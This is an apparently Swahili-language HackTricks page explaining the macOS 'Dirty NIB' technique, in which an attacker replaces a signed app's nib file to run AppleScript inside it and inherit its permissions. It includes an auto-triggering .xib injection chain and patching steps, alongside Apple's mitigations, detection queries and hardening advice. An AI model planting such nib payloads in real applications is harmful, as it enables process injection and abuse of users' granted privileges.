# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB inahusu kutumia vibaya faili za Interface Builder (.xib/.nib) ndani ya signed macOS app bundle ili kutekeleza logic inayodhibitiwa na mshambuliaji ndani ya target process, hivyo kurithi entitlements na ruhusa zake za TCC. Technique hii iliandikwa awali na xpn (MDSec) na baadaye ikaelezwa kwa upana na kupanuliwa kwa kiasi kikubwa na Sector7, ambaye pia alieleza mitigations za Apple katika macOS 13 Ventura na macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Kwa maelezo ya msingi na uchambuzi wa kina, angalia references zilizo mwishoni.

> TL;DR
> • Kabla ya macOS 13 Ventura: kubadilisha MainMenu.nib ya bundle (au nib nyingine inayopakiwa wakati wa startup) kuliruhusu kwa uaminifu kufanikisha process injection na mara nyingi privilege escalation.
> • Tangu macOS 13 (Ventura), na maboresho katika macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints, na ruhusa mpya ya TCC ya “App Management” kwa kiasi kikubwa huzuia nib tampering baada ya launch na apps zisizohusiana. Attacks bado zinaweza kufanikiwa katika hali maalum (kwa mfano, same-developer tooling inayorekebisha apps zake yenyewe, au terminals zilizopewa App Management/Full Disk Access na user).

## Faili za NIB/XIB ni nini

Faili za Nib (kifupi cha NeXT Interface Builder) ni serialized UI object graphs zinazotumiwa na AppKit apps. Xcode ya kisasa huhifadhi editable XML .xib files ambazo hukompailiwa kuwa .nib wakati wa build. App ya kawaida hupakia UI yake kuu kupitia `NSApplicationMain()` ambayo husoma key ya `NSMainNibFile` kutoka kwenye app's Info.plist na ku-instantiates object graph wakati wa runtime.

Mambo muhimu yanayowezesha attack:
- NIB loading hu-instantiate arbitrary Objective-C classes bila kuhitaji zifuate NSSecureCoding (nib loader ya Apple hutumia fallback ya `init`/`initWithFrame:` wakati `initWithCoder:` haipatikani).
- Cocoa Bindings zinaweza kutumiwa vibaya kuita methods wakati nibs zina-instantiated, ikiwemo chained calls ambazo hazihitaji user interaction.


## Dirty NIB injection process (attacker view)

Mtiririko wa kawaida kabla ya Ventura:
1) Create malicious .xib
- Add `NSAppleScript` object (au “gadget” classes nyingine kama `NSTask`).
- Add `NSTextField` ambayo title yake ina payload (kwa mfano, AppleScript au command arguments).
- Add `NSMenuItem` objects moja au zaidi zilizounganishwa kupitia bindings ili kuita methods kwenye target object.

2) Auto-trigger bila user clicks
- Tumia bindings kuweka target/selector ya menu item, kisha invoke private `_corePerformAction` method ili action i-fire moja kwa moja wakati nib inapoload. Hii huondoa hitaji la user kubofya button.

Minimal example ya auto-trigger chain ndani ya .xib (imefupishwa kwa uwazi):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Hii inafanikisha utekelezaji wa kiholela wa AppleScript katika target process wakati wa kupakia nib.<sup>[[1]](#references)</sup> Chains za hali ya juu zinaweza:
- Kuunda instances za classes za AppKit kiholela (k.m., `NSTask`) na kuita methods zisizo na arguments kama `-launch`.
- Kuita selectors kiholela zenye object arguments kupitia binding trick iliyo hapo juu.
- Kupakia AppleScriptObjC.framework ili kuunganisha na Objective-C na hata kuita baadhi ya C APIs.
- Kwenye systems za zamani ambazo bado zinajumuisha Python.framework, kuunganisha na Python na kisha kutumia `ctypes` kuita C functions kiholela (utafiti wa Sector7).<sup>[[2]](#references)</sup>

3) Badilisha nib ya app
- Nakili target.app hadi location inayoweza kuandikwa, badilisha kwa mfano `Contents/Resources/MainMenu.nib` na nib yenye malicious code, kisha endesha target.app. Kabla ya Ventura, baada ya Gatekeeper assessment ya mara moja, launches zilizofuata zilifanya tu shallow signature checks, kwa hivyo resources zisizo executable (kama `.nib`) hazikufanyiwa re-validation.

Mfano wa AppleScript payload kwa test inayoonekana:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Ulinzi wa kisasa wa macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple ilianzisha mitigations kadhaa za kimfumo zinazopunguza kwa kiasi kikubwa uwezekano wa kutumia Dirty NIB katika macOS ya kisasa:<sup>[[2]](#references)</sup>
- Uthibitishaji wa kina wakati wa first launch na ulinzi wa bundle (macOS 13 Ventura)
- Wakati wa ku-run app yoyote kwa mara ya kwanza (iwe quarantined au la), signature check ya kina hukagua resources zote za bundle. Baada ya hapo, bundle hulindwa: ni apps kutoka kwa developer yuleyule pekee (au apps zilizoidhinishwa wazi na app hiyo) zinazoweza kurekebisha yaliyomo. Apps nyingine zinahitaji ruhusa mpya ya TCC ya “App Management” ili kuandika kwenye bundle ya app nyingine.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps haziwezi kunakiliwa kwenda sehemu nyingine na ku-run; hii inaua mbinu ya “copy to /tmp, patch, run” kwa OS apps.
- Maboresho katika macOS 14 Sonoma
- Apple iliimarisha App Management na kurekebisha bypasses zilizojulikana (kwa mfano, CVE‑2023‑40450) zilizotajwa na Sector7. Python.framework iliondolewa mapema (macOS 12.3), na kuvuruga baadhi ya privilege-escalation chains.
- Mabadiliko ya Gatekeeper/Quarantine
- Kwa maelezo mapana zaidi kuhusu Gatekeeper, provenance, na mabadiliko ya assessment yaliyoathiri technique hii, tazama ukurasa uliorejelewa hapa chini.

> Maana ya kiutendaji
> • Kwenye Ventura+ kwa ujumla huwezi kurekebisha .nib ya third-party app isipokuwa process yako iwe na App Management au isainiwe kwa Team ID ileile ya target (kwa mfano, developer tooling).
> • Kutoa App Management au Full Disk Access kwa shells/terminals hufungua tena attack surface hii kwa chochote kinachoweza ku-execute code ndani ya context ya terminal hiyo.


### Kushughulikia Launch Constraints

Launch Constraints huzuia ku-run Apple apps nyingi kutoka locations zisizo za default kuanzia Ventura. Ikiwa ulitegemea workflows za kabla ya Ventura kama kunakili Apple app kwenda temp directory, kurekebisha `MainMenu.nib`, na ku-launch, tarajia ishindwe kwenye >= 13.0.


## Kuhesabu targets na nibs (yenye manufaa kwa research / legacy systems)

- Tafuta apps ambazo UI yake inaendeshwa na nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Tafuta rasilimali za nib zinazoweza kuwa wagombea ndani ya bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Thibitisha code signatures kwa kina (itashindikana ikiwa ulibadilisha resources na hukufanya re-sign):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Kumbuka: Kwenye macOS za kisasa pia utazuiwa na bundle protection/TCC unapojaribu kuandika kwenye bundle ya app nyingine bila authorization inayofaa.


## Vidokezo vya Detection na DFIR

- Ufuatiliaji wa uadilifu wa faili kwenye bundle resources
- Fuatilia mabadiliko ya mtime/ctime kwenye `Contents/Resources/*.nib` na resources nyingine zisizotekelezeka katika apps zilizosakinishwa.
- Unified logs na tabia ya process
- Fuatilia utekelezaji usiotarajiwa wa AppleScript ndani ya GUI apps na processes zinazopakia AppleScriptObjC au Python.framework. Mfano:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Tathmini za proactive
- Endesha mara kwa mara `codesign --verify --deep` kwenye apps muhimu ili kuhakikisha resources zinabaki salama.
- Muktadha wa privilege
- Kagua ni nani/kinachomiliki TCC “App Management” au Full Disk Access (hasa terminals na management agents). Kuondoa ruhusa hizi kutoka general-purpose shells huzuia kwa urahisi kurejesha tampering ya aina ya Dirty NIB.


## Defensive hardening (developers na defenders)

- Pendelea UI ya programmatic au punguza kile kinachotengenezwa kutoka kwenye nibs. Epuka kujumuisha classes zenye nguvu (kwa mfano, `NSTask`) kwenye nib graphs na epuka bindings zinazoweza kuita selectors kwa njia isiyo ya moja kwa moja kwenye objects zisizo za kiholela.
- Tumia hardened runtime yenye Library Validation (tayari ni standard kwa apps za kisasa). Ingawa hii haizuii nib injection yenyewe, inazuia native code loading rahisi na kuwalazimisha attackers kutumia payloads za scripting pekee.
- Usiombe au kutegemea ruhusa pana za App Management kwenye general-purpose tools. Ikiwa MDM inahitaji App Management, tenga muktadha huo na shells zinazoendeshwa na mtumiaji.
- Thibitisha mara kwa mara uadilifu wa app bundle yako na ufanye update mechanisms zako zijirekebishe zenyewe bundle resources.


## Kusoma zaidi katika HackTricks

Jifunze zaidi kuhusu Gatekeeper, quarantine na mabadiliko ya provenance yanayoathiri technique hii:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Marejeo

- [1] [xpn – DirtyNIB (original write-up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
